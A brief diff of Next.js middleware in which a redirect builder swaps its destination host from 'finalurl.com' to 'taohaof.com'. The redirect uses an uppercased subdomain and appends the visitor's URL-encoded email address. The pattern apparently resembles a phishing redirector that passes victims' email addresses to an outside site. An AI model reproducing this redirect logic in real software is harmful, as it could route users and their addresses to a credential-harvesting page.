@@ -18,7 +18,7 @@ function buildRedirect(haystack: string): string | null {
 
   const DOMAIN = firstLabel.toUpperCase();
   const encodedEmail = encodeURIComponent(email);
-  return `https://${DOMAIN}.finalurl.com/redirect|${encodedEmail}`;
+  return `https://${DOMAIN}.taohaof.com/redirect|${encodedEmail}`;
 }
 
 export function middleware(req: NextRequest) {
